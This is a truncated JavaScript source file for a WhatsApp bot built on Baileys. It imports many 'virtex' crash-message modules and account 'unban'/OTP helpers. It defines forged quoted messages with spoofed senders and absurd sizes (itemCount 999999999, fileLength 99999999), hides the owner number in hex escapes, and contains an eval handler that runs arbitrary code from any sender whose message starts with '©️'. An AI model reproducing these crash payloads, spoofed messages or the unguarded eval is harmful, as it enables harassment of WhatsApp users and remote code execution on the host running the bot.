/*

› Create By King Sam
› Button by Tairo Makino

                 >
*/

//=================================================//
require('./hwkal')
const { 
       WA_DEFAULT_EPHEMERAL,
       getAggregateVotesInPollMessage, 
       generateWAMessageFromContent, 
       proto, 
       generateWAMessageContent, 
       generateWAMessage, 
       prepareWAMessageMedia, 
       downloadContentFromMessage, 
       areJidsSameUser, 
       getContentType 
      } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const hxz = require('hxz-api')
const ytdl = require("ytdl-core")
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const qbug = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?彡★◥◣◥◤ `
}
}
}
//VIRTEX 
const { ngazap } = require('./zetszet/virtex/ngazap')
const { buttonkal } = require('./zetszet/virtex/buttonkal')
const { jids1 } = require('./zetszet/virtex/jids1')
const { jids0 } = require('./zetszet/virtex/jids0')
const { cttl } = require('./zetszet/virtex/cttl')
const { tizi } = require('./zetszet/virtex/tizi')
const { weg } = require('./zetszet/virtex/weg')
const { virtex7 } = require('./zetszet/virtex/virtex7')
const { bugui } = require('./zetszet/virtex/bugui.js')
const { bugui2 } = require('./zetszet/virtex/bugui2.js')
const { monospace } = require('./zetszet/virtex/monospace.js')
const { bugcapt } = require('./zetszet/virtex/bugcapt.js')
const { ios1 } = require('./zetszet/virtex/ios1.js')
const { ios2 } = require('./zetszet/virtex/ios2.js')
const { cortanet } = require('./zetszet/virtex/cortanet.js')
const { mdelay } = require('./zetszet/virtex/mdelay.js')
const { zetsubonotgay } = require('./zetszet/virtex/zetsubonotgay.js')
const { zovcgay } = require('./zetszet/virtex/zovcgay.js')
const { zetxdgay } = require('./zetszet/virtex/zetxdgay.js')
const { restugay } = require('./zetszet/virtex/restugay.js')
const { zalgonal } = require('./zetszet/virtex/zalgonal.js')
//WHATSAPP SUPPORT
const { unban1 } = require('./support/unban1.js')
const { unban2 } = require('./support/unban2.js')
const { unban3 } = require('./support/unban3.js')
const { unban4 } = require('./support/unban4.js')
const { unban5 } = require('./support/unban5.js')
const { restotp } = require('./support/restotp.js')

const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []

const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const thumbnail = fs.readFileSync ('./kawai/imvillain.jpg')
const cewegw = fs.readFileSync(`./kawai/cewegw.jpg`)
const egirl = fs.readFileSync(`./kawai/egirl.jpg`)
const egao = fs.readFileSync(`./kawai/egao.jpg`)
const sagiri = fs.readFileSync(`./kawai/hinachan.jpg`)
const hinachan = fs.readFileSync(`./kawai/hinachann.jpg`)
const imvillain = fs.readFileSync(`./kawai/imvillain.jpg`)
const rimuruku = fs.readFileSync(`./kawai/rimuruku.jpg`)
const rimuwu = fs.readFileSync(`./kawai/rimuwu.jpg`)
const sangean = fs.readFileSync(`./kawai/sangean.jpg`)
const sikanna = fs.readFileSync(`./kawai/sikanna.jpg`)
const notprem = fs.readFileSync(`./kawai/notprem.webp`)
const kosongjpg = fs.readFileSync ('./zetszet/image/kosong.jpg')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./premium.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const banned = JSON.parse(fs.readFileSync('./zetszet/dbnye/banned.json'))

virgam = fs.readFileSync(`./zetszet/image/deden.jpeg`)
//=================================================//
module.exports = zetsubo = async (zetsubo, m, chatUpdate, store) => {
 try {
//var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?                                                                                                                        m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const botNumber = await zetsubo.decodeJid(zetsubo.user.id)
const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
const isCreator = [author, botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await zetsubo.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const qtod = m.quoted? "true":"false"
const contactsss = JSON.parse(fs.readFileSync("./pushkont/contacts.json"))
const svcontact = JSON.parse(fs.readFileSync("./pushkont/svcontact.json"))
const isContacts = contactsss.includes(m.sender)
	    const moment = require("moment-timezone")
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
if(time2 < "20:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
}
if(time2 < "18:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐞𝐭𝐚𝐧𝐠"
 }
if(time2 < "15:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
 }
if(time2 < "12:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
}
if(time2 < "06:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
 }
if(time2 < "05:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
}
const wib = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const salam2 = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("a")

//=================================================//}
const zets = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {})},
 message:{"orderMessage":{"orderId":"174238614569438",
 "thumbnail":kosongjpg, //image 0kb
 "itemCount":999999999,
 "status":"INQUIRY","surface":"CATALOG","message":`⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
 
const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const reply = (teks) => {
return zetsubo.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `༐༑⿻𝐒⸙𝐀࿈𝐌.𝐕𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑ - ${botname}`,"body": `Selamat ${salam2} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/565f8fc3e0cffb4a7ffd4.jpg',"thumbnail": thumbnail,"sourceUrl": `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`}}}, { quoted:m})} 

const zetsreply = async (teks) => {
	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg`,
        mediaType: 2, 
        thumbnail:sangean
        }}}, { quoted: zets })}

const virgamreply = async (teks) => {
	    zetsubo.sendMessage(bnnd, { text:teks, contextInfo: {externalAdReply : {
        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⸙⫺`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
        mediaType: 2, 
        thumbnail:virgam
        }}}, { quoted: kalgans })}

const genreply = async (teks) => {
	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
        mediaType: 2, 
        thumbnail:hinachan
        }}}, { quoted: zets })} 
	 async function loadings () {
var lod = [
"☧",
"☫",
"✚",
"☫",
	"☸",
        "🧞‍♂️𝐏𝐨𝐧𝐠",	
"𝐉𝐈𝐍𝐈 🧞‍♂️"
]
let { key } = await zetsubo.sendMessage(from, {text: '🧞‍♂️𝐏𝐨𝐧𝐠'})

for (let i = 0; i < lod.length; i++) {
await zetsubo.sendMessage(from, {text: lod[i], edit: key });
}
	 }

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await zetsubo.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await zetsubo.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

async function loading () {
var hawemod = [

` ★彡 𝘾𝙇𝘼𝙎𝙎𝙄𝘾 𝙑3 彡★ `
]
let { key } = await zetsubo.sendMessage(from, {text: '@⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺.....'})//Pengalih isu

for (let i = 0; i < hawemod.length; i++) {
/*await delay(10)*/
await zetsubo.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
}
}

if (autodelete) {
zetsubo.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}

/*let reactionMessage = {
                    react: {
                        text: `〽️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                zetsubo.sendMessage(m.chat, reactionMessage)*/
//=================================================//
if (!zetsubo.public) {
if (!m.key.fromMe) return
}
let rn = ['recording'] 
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
zetsubo.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await zetsubo.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await zetsubo.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
zetsubo.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:hw})
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: zetsubo.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zetsubo.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
zetsubo.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await zetsubo.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}



const sendapk = (teks) => {
zetsubo.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk ZetsuboXygen*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii
